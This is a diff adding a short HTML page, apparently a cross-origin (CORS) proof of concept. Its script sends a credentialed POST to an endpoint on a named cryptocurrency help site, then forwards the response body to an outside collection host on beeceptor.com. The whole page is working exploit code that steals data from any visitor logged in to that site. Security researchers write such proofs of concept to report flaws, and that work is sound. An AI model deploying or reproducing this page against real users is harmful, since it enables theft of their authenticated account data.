@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://help.crypto.com/cdn-cgi/rum?", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ test: "cors-leak" })
+      })
+      .then(res => res.text())
+      .then(data => {
+        fetch("https://cors-poc.free.beeceptor.com", {
+          method: "POST",
+          mode: "no-cors",
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
